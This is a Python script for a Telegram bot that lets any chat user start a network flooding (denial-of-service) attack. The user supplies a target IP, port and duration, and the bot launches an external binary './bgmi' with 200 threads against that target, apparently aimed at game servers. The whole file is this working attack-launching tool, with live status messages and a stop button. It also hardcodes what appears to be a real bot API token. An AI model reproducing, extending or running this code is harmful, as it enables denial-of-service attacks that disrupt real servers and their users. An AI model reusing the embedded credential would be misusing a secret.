import subprocess
import time
import threading
import logging
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='attack_log.log')

bot = telebot.TeleBot('7241214892:AAHA1-e8PcnlriU5kSx2Ohz4bjXz6cCoNpo')
DEFAULT_THREADS = 200
active_processes = {}
invalid_ports = {8700, 20000, 443, 17500, 9031, 20002, 20001}

def countdown_timer(chat_id, message_id, user_id, target_ip, port, total_time, reply_markup, stop_event):
    remaining_time = int(total_time)
    last_message = None
    while remaining_time > 0 and not stop_event.is_set():
        current_message = (
            f"𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗 𝗢𝗡𝗚𝗢𝗜𝗡𝗚 ⏳\n"
            f"𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n"
            f"𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n"
            f"𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘: {remaining_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n"
            f"𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕"
        )
        if current_message != last_message:
            bot.edit_message_text(current_message, chat_id, message_id, reply_markup=reply_markup)
            last_message = current_message
        time.sleep(1)
        remaining_time -= 1

    flooding_process = active_processes.pop(chat_id, None)
    if flooding_process is not None:
        flooding_process[0].terminate()
    
    if stop_event.is_set():
        final_message = f"𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ❌\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕"
        logging.info(f"Attack stopped by user {user_id} - IP: {target_ip}, Port: {port}, Duration: {total_time}s")
    else:
        final_message = f"𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕"
        logging.info(f"Attack completed by user {user_id} - IP: {target_ip}, Port: {port}, Duration: {total_time}s")

    bot.edit_message_text(final_message, chat_id, message_id)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    cmd = message.text.split()
    if len(cmd) != 3:
        bot.reply_to(message, '<target_ip> <port> <time>')
        return
    target_ip, port, total_time = cmd[0], cmd[1], cmd[2]
    if '.' not in target_ip or not port.isdigit() or not total_time.isdigit():
        bot.reply_to(message, '<target_ip> <port> <time>')
        return
    if int(port) in invalid_ports:
        bot.reply_to(message, 'The port you provided is not valid.')
        return
    flooding_command = ['./bgmi', target_ip, port, total_time, str(DEFAULT_THREADS)]
    flooding_process = subprocess.Popen(flooding_command)
    stop_event = threading.Event()
    active_processes[message.chat.id] = (flooding_process, stop_event)
    buttons = [[InlineKeyboardButton("𝗦𝗧𝗢𝗣🚫", callback_data=f'stop|{target_ip}|{port}')]]
    reply_markup = InlineKeyboardMarkup(buttons)
    reply_message = bot.reply_to(message, f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗢𝗡\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}\n𝗧𝗜𝗠𝗘: {total_time} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n𝗕𝗢𝗧 𝗕𝗬: 𝗡𝗢𝗢𝗕", reply_markup=reply_markup)
    logging.info(f"Attack started by user {message.chat.id} - IP: {target_ip}, Port: {port}, Duration: {total_time}s")
    timer_thread = threading.Thread(target=countdown_timer, args=(message.chat.id, reply_message.message_id, message.chat.id, target_ip, port, total_time, reply_markup, stop_event))
    timer_thread.start()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call: CallbackQuery):
    if call.data.startswith('stop|'):
        _, target_ip, port = call.data.split('|')
        flooding_process, stop_event = active_processes.pop(call.message.chat.id, (None, None))
        if flooding_process is not None:
            stop_event.set()  # Signal the countdown timer to stop
            flooding_process.terminate()
            logging.info(f"Attack stopped by user {call.message.chat.id} - IP: {target_ip}, Port: {port}")
            bot.edit_message_text(
                f"𝗔𝗧𝗧𝗔𝗖𝗞𝗘𝗗 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ❌\n𝗜𝗣: {target_ip}\n𝗣𝗢𝗥𝗧: {port}",
                call.message.chat.id,
                call.message.message_id
            )
        else:
            bot.answer_callback_query(call.id, "No active process found.")

print("Bot Started")
bot.polling()
